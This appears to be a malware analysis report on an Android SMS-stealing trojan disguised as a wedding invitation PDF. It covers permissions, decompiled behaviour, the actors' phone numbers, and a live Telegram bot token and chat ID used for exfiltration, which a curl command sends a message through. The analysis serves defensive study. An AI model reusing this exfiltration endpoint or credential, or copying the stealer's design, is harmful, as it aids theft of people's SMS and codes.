## Introduction
### Tools
#### Decompile
- dex2jar (latest:openjdk-8-jdk)
- jd-gui  (v1.4.2)
#### Profiling & Scanning
- file
- exiftool
- aapt
- virustotal (web-app)
- adb
#### Other
- curl
- jq

### Actor
```
display   : Kuehh
tags      : Mama Desi ila
phone     : +62 812-1337-6563
picture   : Wedding

display   : Duet Abang
tags      : Rico Duren Village
phone     : +62 852-1160-9935
picture   : Wedding
```

### Phising Log
```
06/03/2024, 23:22 - Messages and calls are end-to-end encrypted. No one outside of this chat, not even WhatsApp, can read or listen to them. Tap to learn more.
06/03/2024, 23:22 - 
06/03/2024, 23:22 - +62 812-1337-6563: <Media omitted>
07/03/2024, 05:41 - You blocked this contact. Tap to unblock.
```

### Metadata
```bash
$ mv 💝UNDANGAN PERNIKAHAN💝.pdf undangan-pernikahan.apk
$ exiftool undangan-pernikahan.apk
$ file -k undangan-pernikahan.apk
```
```
File Name                       : 💝UNDANGAN PERNIKAHAN💝.pdf
File Size                       : 4.7 MB
File Modification Date/Time     : 2024:03:09 20:44:04+07:00
File Access Date/Time           : 2024:03:09 20:44:24+07:00
File Inode Change Date/Time     : 2024:03:09 20:44:04+07:00
File Type                       : ZIP
MIME Type                       : application/zip
Zip Modify Date                 : 2024:02:26 12:17:30
Zip Compressed Size             : 3264700
Zip Uncompressed Size           : 9079396
Zip File Name                   : classes.dex

File Detail       : Android package (APK), with classes.dex, with APK Signing Block
Archiving Info    : Zip archive data, at least v2.0, method=deflate, uncompressed size 14460
Last Modified     : Sun, Feb 22 2024 13:24:42
```
## Findings
### Malware Scanning
```
First Submission  : 2024-03-10 03:30:11 UTC
Last Submission   : 2024-03-10 03:30:11 UTC
MD5               : bd3d5f7bcc16174b8068c7419f0e7263 
SHA-256           : 7e2c8312393f4cbc483672182dd963513faed9a8aba4d967676dbf47190c3e6d
File Type         : Android (executable, mobile, apk)
Score             : 15/64 security vendors flagged this file as malicious
                    - BitDefenderFalx: Android.Riskware.SmsSpy.EY
                    - Fortinet: Android/SmsSpy.ZKltr
                    - Kaspersky: HEUR:Trojan-Banker.AndroidOS.UdanganSteal.b
                    - Ikarus: Trojan-Spy.AndroidOS.SMSSpy
                    - WithSecure: Malware.ANDROID/SMSThief.FRMC.Gen
                    ...
Threat Label      : trojan.smsspy/frmc
Threat Categories : trojan, banker
Family Labels     : smsspy, frmc, smsthief
MITRE ATT&CK TTP  : 1. Command & Control (TA0011)
                    2. Discovery (TA0032)
                    3. Collection (TA0035)
IDS Rules Matched : ET INFO Android Device Connectivity Check
Network Comms     : HTTP Request
                      1. http://connectivitycheck.gstatic.com/generate_204 
                    DNS Resolution
                      1. android.googleapis.com
                      2. instantmessaging-pa.googleapis.com
                      3. clientservices.googleapis.com
                      4. gmscompliance-pa.googleapis.com
                      ...
                    Memory Pattern URLs
                      1. http://schemas.android.com/aapt
                      2. http://schemas.android.com/apk/res-auto
                      3. http://schemas.android.com/apk/res/android
                      4. https://api.telegram.org/
                      ...
                    TLS
                      1. firebaseinstallations.googleapis.com 
                      2. www.gstatic.com 
```
### APK Information
```bash
$ aapt dump badging undangan-pernikahan.apk
```
```
package           : name='com.google.cuap' versionCode='1' versionName='1.0' platformBuildVersionName='13' platformBuildVersionCode='32' compileSdkVersion='32' compileSdkVersionCodename='13'
sdkVersion        : '26'
targetSdkVersion  : '32'
uses-permission   : name='android.permission.RECEIVE_SMS'
uses-permission   : name='android.permission.INTERNET'
uses-permission   : name='android.permission.READ_SMS'
uses-permission   : name='android.permission.SEND_SMS'
uses-permission   : name='android.permission.WAKE_LOCK'
uses-permission   : name='android.permission.ACCESS_NETWORK_STATE'
uses-permission   : name='android.permission.RECEIVE_BOOT_COMPLETED'
uses-permission   : name='android.permission.FOREGROUND_SERVICE'
application-label : '𝓤𝓷𝓭𝓪𝓷𝓰𝓪𝓷 𝓟𝓮𝓻𝓷𝓲𝓴𝓪𝓱𝓪𝓷.pdf'
application-debuggable
feature-group           : label=''
  uses-feature          : name='android.hardware.faketouch'
  uses-implied-feature  : name='android.hardware.faketouch' reason='default feature for all apps'
  uses-feature          : name='android.hardware.telephony'
  uses-implied-feature  : name='android.hardware.telephony' reason='requested a telephony permission'
provides-component      : 'notification-listener'
```

### Static Analysis
```bash
$ d2j-dex2jar undangan-pernikahan.apk ## generate undangan-pernikahan-dex2jar.jar
$ jd-gui ## import .jar and save all source
$ unzip undangan-pernikahan-dex2jar.jar.src.zip -d src ## unzip the generated .zip archive
$ subl src ## open the project folder to start
```
```r
class   : MainActivity (AppCompatActivity extended)
package : com.example.myapplicatior
imports : android, androidx, java, okhttp3 
--
Telegram API: https://api.telegram.org/bot7107377550:AAHNS-fTQUSO9OaynigVWMHn9DTqrh2gbUw
  - Chat ID: 7067506660
  - Custom Message:
    + onReceive: "*[package-name]* *From :* _[title]_ *Message :* _[messsage-body]_"
    + onRequestPermissionsResult [granted]: " : _[device-info]" || "Error : _[str3]"
    + onRequestPermissionsResult [denied]: " : _[device-info]_"
SmsManager sendTextMessage [granted]:
  - destinationAddress: 085211609935
  - scAddress: NULL
  - text: " paket gratis 100gb. "
Permission Setting & Message
  - android.permission.RECEIVE_SMS
  - android.permission.SEND_SMS
  - android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS: "Aktifkan Izin Aplikasi!" || "Permission Not Granted!"
```
```r
class   : MainActivityAlias (AppCompatActivity extended)
package : com.example.myapplicatior
imports : android, androidx
--
Permission Setting & Message
  - android.app.action.ADD_DEVICE_ADMIN
  - android.app.extra.DEVICE_ADMIN: ComponentName(MainActivity.class)
  - android.app.extra.ADD_EXPLANATION: "Bấm zô nút đồng ý(ACTIVE á)" / "Click The OK Button (Active)"
```
```r
class   : SendSMS (BroadcastReceiver extended)
package : com.example.myapplicatior
imports : android, java, okhttp3
--
Telegram API: https://api.telegram.org/bot7107377550:AAHNS-fTQUSO9OaynigVWMHn9DTqrh2gbUw
  - Chat ID: 7067506660
  - Custom Message: "Berhasil Kirim SMS dari Jauh Kepada : _[dest-number]_, message : _[messsage-body]_"
```
```r
class   : ReceiveSms (BroadcastReceiver extended)
package : com.example.myapplicatior
imports : android, java, okhttp3
--
Device Build Information:
  - ID        - BOARD       - DEVICE        - TIME
  - USER      - BOOTLOADER  - TAGS          - MODEL
  - PRODUCT   - DISPLAY     - FINGERPRINT   - MANUFACTURER
  - BRAND     - HOST        - TYPE
Telegram API: https://api.telegram.org/bot7107377550:AAHNS-fTQUSO9OaynigVWMHn9DTqrh2gbUw
  - Chat ID: 7067506660
  - Custom Message: "New SMS Received  sender : _[src-number]_, message : _[device-info]"
```
```r
class   : NotificationService (NotificationListenerService extended)
package : com.example.myapplicatior
imports : android, androidx
--
StatusBar Notification Information:
  - paramStatusBarNotification.getPackageName()
  - android.title
  - android.text
  - android.id
```

### Dynamic Analysis
```bash
$ adb install -t undangan-pernikahan.apk
```
on progress

### Telegram API Call Sample
```bash
$ curl -s "https://api.telegram.org/bot7107377550:AAHNS-fTQUSO9OaynigVWMHn9DTqrh2gbUw/sendMessage?parse_mode=markdown&chat_id=7067506660&text=pwnd" | jq .
```
```js
{
  "ok": true,
  "result": {
    "message_id": 50380,
    "from": {
      "id": 7107377550,
      "is_bot": true,
      "first_name": "Undangan pernikahan",
      "username": "Yayayaya444_bot"
    },
    "chat": {
      "id": 7067506660,
      "first_name": "Yaya",
      "type": "private"
    },
    "date": 1710138877,
    "text": "pwnd"
  }
}
```